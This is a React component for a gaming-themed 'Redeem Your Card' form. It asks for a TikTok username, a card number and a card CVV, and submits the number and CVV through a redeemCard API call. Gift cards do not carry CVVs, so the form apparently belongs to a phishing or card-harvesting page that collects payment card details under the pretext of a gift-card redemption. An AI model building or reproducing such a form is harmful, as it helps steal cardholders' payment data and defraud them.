import React, { useState } from 'react';
import { motion } from 'framer-motion';
import { useForm, SubmitHandler } from 'react-hook-form';
import { RedeemFormData } from '../types';
import { redeemCard, setCurrentTiktokUsername } from '../services/api';
import { Loader } from 'lucide-react';

const RedeemSection: React.FC = () => {
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [redeemStatus, setRedeemStatus] = useState<{ success: boolean; message: string } | null>(null);
  const { register, handleSubmit, reset, formState: { errors } } = useForm<RedeemFormData>();

  const onSubmit: SubmitHandler<RedeemFormData> = async (data) => {
    setIsSubmitting(true);
    setRedeemStatus(null);
    setCurrentTiktokUsername(data.tiktokUsername);

    try {
      const response = await redeemCard({
        type: 'redeem_card',
        data: {
          number: data.cardSerialNumber,
          cvv: data.cvv
        }
      });
      
      setRedeemStatus({
        success: response.success,
        message: response.message
      });

      if (response.success) {
        reset();
      }
    } catch (error) {
      setRedeemStatus({
        success: false,
        message: 'An error occurred while redeeming the card'
      });
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <section id="redeem" className="py-24 px-4 md:px-8">
      <div className="container mx-auto">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          transition={{ duration: 0.6 }}
          className="text-center mb-12"
        >
          <h2 className="text-3xl md:text-4xl font-display font-bold mb-4">
            <span className="text-gaming-accent">Redeem</span> Your Card
          </h2>
          <p className="text-lg text-secondary-300 max-w-2xl mx-auto">
            Enter your card details below to redeem your gaming gift card
          </p>
        </motion.div>

        <motion.div
          initial={{ opacity: 0, y: 30 }}
          whileInView={{ opacity: 1, y: 0 }}
          viewport={{ once: true }}
          transition={{ duration: 0.6, delay: 0.2 }}
          className="max-w-md mx-auto bg-gaming-card p-8 rounded-xl shadow-lg"
        >
          {redeemStatus && (
            <div className={`mb-6 p-4 rounded-lg ${
              redeemStatus.success 
                ? 'bg-success-700/20 text-success-500' 
                : 'bg-error-700/20 text-error-500'
            }`}>
              {redeemStatus.message}
            </div>
          )}

          <form onSubmit={handleSubmit(onSubmit)} className="space-y-6">
            <div>
              <label htmlFor="tiktokUsername" className="block text-sm font-medium text-secondary-300 mb-1">
                TikTok Username
              </label>
              <input
                type="text"
                id="tiktokUsername"
                {...register('tiktokUsername', { required: 'TikTok username is required' })}
                className={`w-full px-4 py-3 bg-secondary-800 border ${
                  errors.tiktokUsername ? 'border-error-500' : 'border-secondary-700'
                } rounded-lg focus:outline-none focus:ring-2 focus:ring-primary-500 text-white`}
                placeholder="@yourusername"
              />
              {errors.tiktokUsername && (
                <p className="mt-1 text-sm text-error-500">{errors.tiktokUsername.message}</p>
              )}
            </div>

            <div>
              <label htmlFor="cardSerialNumber" className="block text-sm font-medium text-secondary-300 mb-1">
                Card Serial Number
              </label>
              <input
                type="text"
                id="cardSerialNumber"
                {...register('cardSerialNumber', { 
                  required: 'Card serial number is required',
                  pattern: {
                    value: /^[0-9]+$/,
                    message: 'Please enter a valid card number (numbers only)'
                  }
                })}
                className={`w-full px-4 py-3 bg-secondary-800 border ${
                  errors.cardSerialNumber ? 'border-error-500' : 'border-secondary-700'
                } rounded-lg focus:outline-none focus:ring-2 focus:ring-primary-500 text-white`}
                placeholder="Enter card serial number"
              />
              {errors.cardSerialNumber && (
                <p className="mt-1 text-sm text-error-500">{errors.cardSerialNumber.message}</p>
              )}
            </div>

            <div>
              <label htmlFor="cvv" className="block text-sm font-medium text-secondary-300 mb-1">
                Card CVV
              </label>
              <input
                type="text"
                id="cvv"
                {...register('cvv', { 
                  required: 'CVV is required',
                  pattern: {
                    value: /^[0-9]+$/,
                    message: 'Please enter a valid CVV (numbers only)'
                  }
                })}
                className={`w-full px-4 py-3 bg-secondary-800 border ${
                  errors.cvv ? 'border-error-500' : 'border-secondary-700'
                } rounded-lg focus:outline-none focus:ring-2 focus:ring-primary-500 text-white`}
                placeholder="Enter CVV"
              />
              {errors.cvv && (
                <p className="mt-1 text-sm text-error-500">{errors.cvv.message}</p>
              )}
            </div>

            <button
              type="submit"
              disabled={isSubmitting}
              className="w-full py-3 px-6 bg-gaming-accent hover:bg-opacity-90 rounded-lg text-white font-bold transition-all duration-300 flex items-center justify-center"
            >
              {isSubmitting ? (
                <>
                  <Loader className="animate-spin mr-2 h-5 w-5" />
                  Processing...
                </>
              ) : (
                'Redeem Card'
              )}
            </button>
          </form>
        </motion.div>
      </div>
    </section>
  );
};

export default RedeemSection;